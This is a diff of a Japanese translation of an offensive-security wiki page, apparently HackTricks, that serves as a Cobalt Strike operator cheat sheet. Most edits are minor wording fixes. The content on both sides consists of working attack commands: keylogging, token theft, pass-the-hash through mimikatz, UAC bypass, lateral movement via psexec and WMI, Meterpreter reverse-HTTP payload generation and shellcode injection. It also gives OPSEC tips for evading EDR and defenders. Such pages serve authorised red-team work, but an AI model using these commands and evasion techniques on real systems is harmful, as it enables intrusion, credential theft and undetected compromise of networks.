@@ -25,8 +25,8 @@
 
 * **`HTMLApplication`** HTAファイル用
 * **`MS Office Macro`** マクロ付きのオフィス文書用
-* **`Windows Executable`** .exe、.dll、またはサービス.exe用
-* **`Windows Executable (S)`** **ステージレス** .exe、.dll、またはサービス.exe用（ステージレスの方がステージ付きよりも良い、IoCsが少ない）
+* **`Windows Executable`** .exe、.dll、またはサービス .exe 用
+* **`Windows Executable (S)`** **ステージレス** .exe、.dll、またはサービス .exe 用（ステージレスの方がステージ付きよりも良い、IoCsが少ない）
 
 #### ペイロードの生成とホスティング
 
@@ -34,7 +34,7 @@
 
 #### ペイロードのホスティング
 
-ホスティングしたいファイルがすでにウェブサーバーにある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルとウェブサーバーの設定を選択します。
+ホスティングしたいファイルがすでにある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルとウェブサーバーの設定を選択します。
 
 ### ビークンオプション
 
@@ -46,21 +46,21 @@ execute-assembly </path/to/executable.exe>
 printscreen    # PrintScrメソッドを使用して単一のスクリーンショットを撮る
 screenshot     # 単一のスクリーンショットを撮る
 screenwatch    # デスクトップの定期的なスクリーンショットを撮る
-## スクリーンショットを見るには、View -> Screenshotsに移動します
+## 表示 -> スクリーンショットに移動して確認する
 
 # キーロガー
 keylogger [pid] [x86|x64]
-## View > Keystrokesで押されたキーを見る
+## 表示 > キーストロークで押されたキーを確認する
 
 # ポートスキャン
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内にポートスキャンアクションを注入
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内でポートスキャンアクションを注入
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # PowerShell
 ## PowerShellモジュールをインポート
 powershell-import C:\path\to\PowerView.ps1
 powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
-powershell <ここにPowerShellコマンドを書くだけ> # これはサポートされている最高のPowerShellバージョンを使用します（opsecではありません）
+powershell <ここにPowerShellコマンドを書くだけ> # これはサポートされている最高のPowerShellバージョンを使用します（opsecではない）
 powerpick <cmdlet> <args> # これはspawntoで指定された犠牲プロセスを作成し、より良いopsecのためにUnmanagedPowerShellを注入します（ログなし）
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # これは指定されたプロセスにUnmanagedPowerShellを注入してPowerShellコマンドレットを実行します。
@@ -70,7 +70,7 @@ psinject <pid> <arch> <commandlet> <arguments> # これは指定されたプロ�
 make_token [DOMAIN\user] [password] # ネットワーク内のユーザーを偽装するためのトークンを作成
 ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
 rev2self # make_tokenで生成されたトークンの使用を停止
-## make_tokenの使用はイベント4624を生成します：アカウントが正常にログオンしました。このイベントはWindowsドメインで非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。上記のように、これはLOGON32_LOGON_NEW_CREDENTIALSを使用します（タイプ9）。
+## make_tokenの使用はイベント4624を生成します: アカウントが正常にログオンしました。このイベントはWindowsドメインで非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。上記のように、これはLOGON32_LOGON_NEW_CREDENTIALSを使用します（タイプ9）。
 
 # UACバイパス
 elevate svc-exe <listener>
@@ -85,22 +85,22 @@ ls \\computer_name\c$ # 生成したトークンを使用してコンピュー�
 rev2self # steal_tokenからのトークンの使用を停止
 
 ## 新しいクレデンシャルでプロセスを起動
-spawnas [domain\username] [password] [listener] # 読み取りアクセスのあるディレクトリから実行します：cd C:\
-## make_tokenのように、これはWindowsイベント4624を生成します：アカウントが正常にログオンしましたが、ログオンタイプは2（LOGON32_LOGON_INTERACTIVE）です。呼び出しユーザー（TargetUserName）と偽装されたユーザー（TargetOutboundUserName）が詳細に記載されます。
+spawnas [domain\username] [password] [listener] # 読み取りアクセスのあるディレクトリから実行する: cd C:\
+## make_tokenのように、これはWindowsイベント4624を生成します: アカウントが正常にログオンしましたが、ログオンタイプは2（LOGON32_LOGON_INTERACTIVE）です。呼び出しユーザー（TargetUserName）と偽装されたユーザー（TargetOutboundUserName）が詳細に記載されます。
 
 ## プロセスに注入
 inject [pid] [x64|x86] [listener]
-## OpSecの観点から：本当に必要でない限り、クロスプラットフォームの注入は行わないでください（例：x86 -> x64またはx64 -> x86）。
+## OpSecの観点から: 本当に必要でない限り、クロスプラットフォームの注入は行わないでください（例: x86 -> x64 または x64 -> x86）。
 
 ## ハッシュを渡す
-## この修正プロセスはLSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light（PPL）が有効な場合はあまり実行可能ではありません。
+## この修正プロセスはLSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light (PPL)が有効な場合はあまり実行可能ではありません。
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## mimikatzを介してハッシュを渡す
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## /runなしで、mimikatzはcmd.exeを生成します。デスクトップを持つユーザーとして実行している場合、彼はシェルを見るでしょう（SYSTEMとして実行している場合は問題ありません）
-steal_token <pid> #mimikatzによって作成されたプロセスからトークンを盗む
+## /runなしで、mimikatzはcmd.exeを生成します。デスクトップを持つユーザーとして実行している場合、シェルが表示されます（SYSTEMとして実行している場合は問題ありません）
+steal_token <pid> # mimikatzによって作成されたプロセスからトークンを盗む
 
 ## チケットを渡す
 ## チケットをリクエスト
@@ -133,7 +133,7 @@ steal_token <pid>
 # 横移動
 ## トークンが作成されている場合は使用されます
 jump [method] [target] [listener]
-## メソッド：
+## メソッド:
 ## psexec                    x86   サービスを使用してサービスEXEアーティファクトを実行
 ## psexec64                  x64   サービスを使用してサービスEXEアーティファクトを実行
 ## psexec_psh                x86   サービスを使用してPowerShellワンライナーを実行
@@ -142,7 +142,7 @@ jump [method] [target] [listener]
 ## wmi_msbuild               x64   msbuildインラインC#タスクを使用したwmi横移動（opsec）
 
 remote-exec [method] [target] [command] # remote-execは出力を返しません
-## メソッド：
+## メソッド:
 ## psexec                          サービスコントロールマネージャー経由でリモート実行
 ## winrm                           WinRM（PowerShell）経由でリモート実行
 ## wmi                             WMI経由でリモート実行
@@ -159,7 +159,7 @@ msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## Cobaltで：Listeners > Add でペイロードをForeign HTTPに設定します。ホストを10.10.5.120、ポートを8080に設定し、保存をクリックします。
+## Cobaltで: リスナー > Addを選択し、ペイロードをForeign HTTPに設定します。ホストを10.10.5.120、ポートを8080に設定し、保存をクリックします。
 beacon> spawn metasploit
 ## 外部リスナーでx86 Meterpreterセッションのみを生成できます。
 
@@ -170,7 +170,7 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw 
 
 ## binファイルをCobalt Strikeホストにコピー
 ps
-shinject <pid> x64 C:\Payloads\msf.bin #x64プロセスにMetasploitシェルコードを注入
+shinject <pid> x64 C:\Payloads\msf.bin # x64プロセスにMetasploitシェルコードを注入
 
 # MetasploitセッションをCobalt Strikeに渡す
 ## ステージレスビークンシェルコードを生成し、Attacks > Packages > Windows Executable (S)に移動し、希望のリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用します。
@@ -187,20 +187,20 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`** は、リモートプロセス注入を使用して指定されたプログラムを実行する**犠牲プロセス**を使用します。これは非常に騒がしく、プロセス内に注入するために特定のWin APIが使用され、すべてのEDRがチェックしています。しかし、同じプロセス内に何かをロードするために使用できるカスタムツールもいくつかあります：
+**`execute-assembly`** は、リモートプロセス注入を使用して指定されたプログラムを実行するために**犠牲プロセス**を使用します。これは非常に騒がしく、プロセス内に注入するために特定のWin APIが使用され、すべてのEDRがチェックしています。しかし、同じプロセス内に何かをロードするために使用できるカスタムツールもいくつかあります：
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
-- Cobalt Strikeでは、BOF（Beacon Object Files）も使用できます：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
+- Cobalt Strikeでは、BOF（Beacon Object Files）も使用できます: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-アグレッサースクリプト `https://github.com/outflanknl/HelpColor` は、Cobalt Strikeで `helpx` コマンドを作成し、コマンドに色を付けてBOFs（緑）、Frok&Run（黄色）などを示し、プロセス実行、注入、または類似のもの（赤）を示します。これにより、どのコマンドがよりステルスであるかを知るのに役立ちます。
+アグレッサースクリプト `https://github.com/outflanknl/HelpColor` は、Cobalt Strike内で `helpx` コマンドを作成し、コマンドに色を付けてBOFs（緑）、Frok&Run（黄）、またはプロセス実行、注入、または類似のもの（赤）を示します。これにより、どのコマンドがよりステルスであるかを知るのに役立ちます。
 
 ### ユーザーとして行動する
 
 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のようなイベントを確認できます：
 
-- セキュリティEID 4624 - 通常の操作時間を知るためにすべてのインタラクティブログオンを確認します。
+- セキュリティEID 4624 - 通常の営業時間を知るためにすべてのインタラクティブログオンを確認します。
 - システムEID 12,13 - シャットダウン/起動/スリープの頻度を確認します。
 - セキュリティEID 4624/4625 - 有効/無効なNTLM試行を確認します。
 - セキュリティEID 4648 - プレーンテキストのクレデンシャルがログオンに使用されたときにこのイベントが生成されます。プロセスが生成した場合、バイナリは構成ファイルまたはコード内にプレーンテキストのクレデンシャルを持っている可能性があります。
@@ -209,7 +209,7 @@ Cobalt Strikeから `jump` を使用する場合、新しいプロセスをよ�
 
 ### コンピュータアカウントを使用する
 
-防御者がユーザーから生成された奇妙な動作をチェックし、**サービスアカウントやコンピュータアカウント（`*$`など）を監視から除外する**ことが一般的です。これらのアカウントを使用して横移動や特権昇格を行うことができます。
+防御者がユーザーから生成された奇妙な動作をチェックしていることが一般的であり、**サービスアカウントやコンピュータアカウント（`*$`など）を監視から除外する**ことがあります。これらのアカウントを使用して横移動や特権昇格を行うことができます。
 
 ### ステージレスペイロードを使用する
 
@@ -217,7 +217,7 @@ Cobalt Strikeから `jump` を使用する場合、新しいプロセスをよ�
 
 ### トークンとトークンストア
 
-トークンを盗むまたは生成する際には注意が必要です。EDRがすべてのスレッドのトークンを列挙し、**異なるユーザー**またはプロセス内のSYSTEMに属するトークンを見つける可能性があります。
+トークンを盗むまたは生成する際には注意が必要です。EDRがすべてのスレッドのトークンを列挙し、**異なるユーザー**またはプロセス内のSYSTEMに属するトークンを見つける可能性があるためです。
 
 これにより、**ビークンごとにトークンを保存**できるため、同じトークンを何度も盗む必要がなくなります。これは横移動や盗まれたトークンを複数回使用する必要がある場合に便利です：
 
@@ -232,17 +232,17 @@ Cobalt Strikeから `jump` を使用する場合、新しいプロセスをよ�
 
 ### ガードレール
 
-Cobalt Strikeには、**ガードレール**と呼ばれる機能があり、防御者によって検出される可能性のある特定のコマンドやアクションの使用を防ぐのに役立ちます。ガードレールは、`make_token`、`jump`、`remote-exec`など、横移動や特権昇格に一般的に使用される特定のコマンドをブロックするように設定できます。
+Cobalt Strikeには、**ガードレール**と呼ばれる機能があり、防御者によって検出される可能性のある特定のコマンドやアクションの使用を防ぐのに役立ちます。ガードレールは、`make_token`、`jump`、`remote-exec`など、横移動や特権昇格に一般的に使用される特定のコマンドをブロックするように構成できます。
 
 さらに、リポジトリ [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) には、ペイロードを実行する前に考慮すべきいくつかのチェックやアイデアも含まれています。
 
 ### チケットの暗号化
 
-ADでは、チケットの暗号化に注意してください。デフォルトでは、一部のツールはKerberosチケットにRC4暗号化を使用しますが、これはAES暗号化よりも安全性が低く、デフォルトで最新の環境ではAESが使用されます。これは、弱い暗号化アルゴリズムを監視している防御者によって検出される可能性があります。
+AD内では、チケットの暗号化に注意してください。デフォルトでは、一部のツールはKerberosチケットにRC4暗号化を使用しますが、これはAES暗号化よりも安全性が低く、デフォルトで最新の環境ではAESが使用されます。これは、弱い暗号化アルゴリズムを監視している防御者によって検出される可能性があります。
 
 ### デフォルトを避ける
 
-Cobalt Strikeを使用する際、デフォルトでSMBパイプは `msagent_####` および `"status_####` という名前になります。これらの名前を変更してください。Cobalt Strikeから既存のパイプの名前を確認するには、コマンド `ls \\.\pipe\` を使用します。
+Cobalt Strikeを使用する際、デフォルトではSMBパイプの名前は `msagent_####` および `"status_####` になります。これらの名前を変更してください。Cobalt Strikeから既存のパイプの名前を確認するには、コマンド: `ls \\.\pipe\` を使用します。
 
 さらに、SSHセッションでは `\\.\pipe\postex_ssh_####` というパイプが作成されます。これを `set ssh_pipename "<new_name>";` で変更します。
 
@@ -264,7 +264,7 @@ Cobalt Strikeプロファイルでは、次のようなことも変更できま�
 
 ### 騒がしいプロセス注入
 
-プロセスにコードを注入する際、通常は非常に騒がしいです。これは、**通常のプロセスがこのアクションを実行しないため、そしてこの方法が非常に限られているため**です。したがって、行動ベースの検出システムによって検出される可能性があります。さらに、EDRがネットワークをスキャンして**ディスクにないコードを含むスレッド**を探している場合にも検出される可能性があります（ただし、JITを使用するブラウザなどのプロセスはこれを一般的に使用しています）。例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+プロセスにコードを注入する際、通常は非常に騒がしいです。これは、**通常のプロセスがこのアクションを実行しないため、またこの方法が非常に限られているため**です。したがって、行動ベースの検出システムによって検出される可能性があります。さらに、EDRがネットワークをスキャンして**ディスクに存在しないコードを含むスレッド**を探している場合にも検出される可能性があります（ただし、JITを使用するブラウザなどのプロセスはこれを一般的に使用しています）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PIDとPPIDの関係
 
@@ -282,9 +282,9 @@ spawnto x86 svchost.exe
 
 攻撃者は時々、ツールをローカルで実行する必要があり、Linuxマシンでも、被害者のトラフィックをツールに到達させる必要があります（例：NTLMリレー）。
 
-さらに、パス・ザ・ハッシュやパス・ザ・チケット攻撃を行う際、攻撃者が**自分のLSASSプロセスにこのハッシュやチケットを追加する方が**、被害者のマシンのLSASSプロセスを変更するよりもステルス性が高いことがあります。
+さらに、パス・ザ・ハッシュやパス・ザ・チケット攻撃を行う際、攻撃者が**自分のLSASSプロセスにこのハッシュやチケットを追加する**方が、被害者のマシンのLSASSプロセスを変更するよりもステルス性が高いことがあります。
 
-しかし、**生成されたトラフィックには注意が必要です**。バックドアプロセスから珍しいトラフィック（Kerberos？）を送信している可能性があるためです。このため、ブラウザプロセスにピボットすることができます（ただし、プロセスに自分を注入して捕まる可能性があるため、ステルスな方法を考えてください）。
+しかし、**生成されたトラフィックに注意する必要があります**。バックドアプロセスから珍しいトラフィック（Kerberos？）を送信している可能性があるためです。このため、ブラウザプロセスにピボットすることができます（ただし、プロセスに自分を注入して捕まる可能性があるため、ステルスな方法を考えてください）。
 ```bash
 
 ### Avoiding AVs
@@ -292,6 +292,7 @@ spawnto x86 svchost.exe
 #### AV/AMSI/ETW Bypass
 
 Check the page:
+
 
 {{#ref}}
 av-bypass.md
